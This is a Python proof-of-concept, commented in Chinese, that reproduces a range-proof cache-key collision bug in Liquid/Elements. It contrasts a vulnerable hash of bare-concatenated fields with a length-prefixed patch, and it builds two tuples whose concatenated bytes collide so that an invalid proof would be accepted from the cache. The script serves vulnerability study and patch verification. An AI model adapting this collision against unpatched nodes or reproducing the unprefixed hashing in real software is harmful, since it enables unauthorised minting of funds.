#!/usr/bin/env python3
"""
Liquid Network（Elements）range proof 缓存 key 碰撞漏洞复现 —— 最小独立版

对应 2026-09-06 导致约 4000 L-BTC 被凭空铸造的 consensus bug。
本脚本不依赖任何第三方库，直接复刻 Elements 源码里
src/script/sigcache.cpp 的 ComputeEntryRangeProof 两个版本：

  - vulnerable()：2026-08-03 commit 212c43f47 之后的写法。
      把 proof || value_commitment || asset_commitment || scriptPubKey
      这四个变长字段用「裸拼接」喂进 SHA256，没有任何长度前缀。
  - patched()：2026-09-08 commit 94000967f 的写法。
      改用 CHashWriter(SER_GETHASH)，每个字段带长度前缀再哈希。

只演示「缓存 key 怎么碰撞」这一核心，不触碰任何真实网络。
mainnet 早已升级到 v23.3.4，此 bug 在主网不复存在。

运行：python3 collision_demo.py
"""

import hashlib

# ---------------------------------------------------------------------------
# 复刻 Elements 的两种 cache key 计算
# ---------------------------------------------------------------------------

# 进程内随机盐的 midstate。真实代码里是 nonce(32) || 'r' padding(32)，
# 这里固定住只为让结果可复现；它对碰撞与否没有任何影响。
SALT = bytes.fromhex("00" * 32) + b"r" + bytes(31)


def vulnerable_key(proof: bytes, value_c: bytes, asset_c: bytes, spk: bytes) -> bytes:
    """212c43f47 之后、94000967f 之前的写法：裸拼接。

    C++ 对应：
        CSHA256 hasher = m_salted_hasher_range_proof;
        hasher.Write(proof).Write(commitment)
              .Write(asset_commitment).Write(scriptPubKey)
              .Finalize(entry);
    """
    h = hashlib.sha256()
    h.update(SALT)
    h.update(proof + value_c + asset_c + spk)  # ← 四个变长字段之间没有分隔
    return h.digest()


def _ser_varlen(field: bytes) -> bytes:
    """复刻 Bitcoin/Elements 的 CompactSize 长度前缀序列化（WriteCompactSize + 数据）。
    字段 < 253 字节时，前缀就是单字节长度。"""
    n = len(field)
    if n < 0xFD:
        prefix = n.to_bytes(1, "little")
    elif n <= 0xFFFF:
        prefix = b"\xfd" + n.to_bytes(2, "little")
    elif n <= 0xFFFFFFFF:
        prefix = b"\xfe" + n.to_bytes(4, "little")
    else:
        prefix = b"\xff" + n.to_bytes(8, "little")
    return prefix + field


def patched_key(proof: bytes, value_c: bytes, asset_c: bytes, spk: bytes) -> bytes:
    """94000967f 的写法：CHashWriter，每个字段带长度前缀。

    C++ 对应：
        CHashWriter hasher = m_salted_hasher_range_proof;  // SER_GETHASH
        hasher << proof << commitment << asset_commitment << script_pub_key;
        entry = hasher.GetSHA256();
    """
    h = hashlib.sha256()
    h.update(SALT)
    for field in (proof, value_c, asset_c, spk):
        h.update(_ser_varlen(field))
    return h.digest()


# ---------------------------------------------------------------------------
# 构造攻击者的两笔「可碰撞」输出
# ---------------------------------------------------------------------------
# 思路（来自 CertiK 复盘）：四个字段 (proof, value_c, asset_c, spk) 在裸拼接下
# 变成一条字节流。攻击者把「字段边界」整体平移，让两组完全不同的 (P,C,A,S)
# 拼出一模一样的字节流，从而命中同一个 cache 条目。
#
# 其中 OP_RETURN = 0x6a；6a43 = OP_RETURN + push 0x43(67) 字节。
# 一笔是「合法 setup 输出」：rangeproof 真实有效，会被真正验证并写入缓存。
# 另一笔是「非法铸造输出」：rangeproof 其实是垃圾，但因为缓存 key 撞上了，
# 直接命中 → VerifyRangeProof 返回 true，从未真正做密码学验证。

# 公共片段
P0      = bytes.fromhex("11" * 100)   # 一段合法 rangeproof 的前缀部分
C0      = bytes.fromhex("22" * 33)    # 合法输出的 value commitment
C1      = bytes.fromhex("33" * 33)    # 非法输出的 value commitment
X       = bytes.fromhex("44" * 33)    # asset commitment（两笔相同）
PUSH    = bytes.fromhex("6a43")       # OP_RETURN + push 67 字节
OPRET   = bytes.fromhex("6a")         # OP_RETURN

# —— 合法 setup 输出 ——
#   proof   = P0
#   value_c = C0
#   asset_c = X
#   spk     = 6a43 || C1 || X || 6a   （把后面那些字节“藏”在 scriptPubKey 里）
valid_tuple = (
    P0,
    C0,
    X,
    PUSH + C1 + X + OPRET,
)

# —— 非法铸造输出 ——
#   proof   = P0 || C0 || X || 6a43   （把前面那些字节“挪”进 rangeproof 里）
#   value_c = C1
#   asset_c = X
#   spk     = 6a
attack_tuple = (
    P0 + C0 + X + PUSH,
    C1,
    X,
    OPRET,
)


def raw_concat(t):
    return t[0] + t[1] + t[2] + t[3]


def main():
    print("=" * 70)
    print("Liquid / Elements range proof 缓存 key 碰撞演示")
    print("=" * 70)

    print("\n[1] 合法输出的四字段（会被真实验证并缓存）:")
    print(f"    proof       {len(valid_tuple[0]):>4} 字节")
    print(f"    value_c     {len(valid_tuple[1]):>4} 字节")
    print(f"    asset_c     {len(valid_tuple[2]):>4} 字节")
    print(f"    scriptPubKey{len(valid_tuple[3]):>4} 字节")

    print("\n[2] 非法输出的四字段（rangeproof 是垃圾，本应验证失败）:")
    print(f"    proof       {len(attack_tuple[0]):>4} 字节")
    print(f"    value_c     {len(attack_tuple[1]):>4} 字节")
    print(f"    asset_c     {len(attack_tuple[2]):>4} 字节")
    print(f"    scriptPubKey{len(attack_tuple[3]):>4} 字节")

    rc_valid = raw_concat(valid_tuple)
    rc_attack = raw_concat(attack_tuple)
    print(f"\n[3] 裸拼接后的字节流长度: 合法={len(rc_valid)}  非法={len(rc_attack)}")
    print(f"    两条字节流完全相同？ {rc_valid == rc_attack}")

    vk_valid = vulnerable_key(*valid_tuple)
    vk_attack = vulnerable_key(*attack_tuple)
    print("\n[4] 漏洞版 cache key（裸拼接）:")
    print(f"    合法 key = {vk_valid.hex()}")
    print(f"    非法 key = {vk_attack.hex()}")
    print(f"    >>> 碰撞？ {vk_valid == vk_attack}  "
          f"{'← 非法输出命中合法缓存，直接被判 valid！' if vk_valid == vk_attack else ''}")

    pk_valid = patched_key(*valid_tuple)
    pk_attack = patched_key(*attack_tuple)
    print("\n[5] 补丁版 cache key（CHashWriter 长度前缀）:")
    print(f"    合法 key = {pk_valid.hex()}")
    print(f"    非法 key = {pk_attack.hex()}")
    print(f"    >>> 碰撞？ {pk_valid == pk_attack}  "
          f"{'' if pk_valid == pk_attack else '← 不再碰撞，非法输出会走真实验证并被拒绝。'}")

    print("\n" + "=" * 70)
    ok = (vk_valid == vk_attack) and (pk_valid != pk_attack)
    print(f"结论：漏洞版碰撞成立、补丁版碰撞消失  ——  {'复现成功 ✅' if ok else '异常 ❌'}")
    print("=" * 70)
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
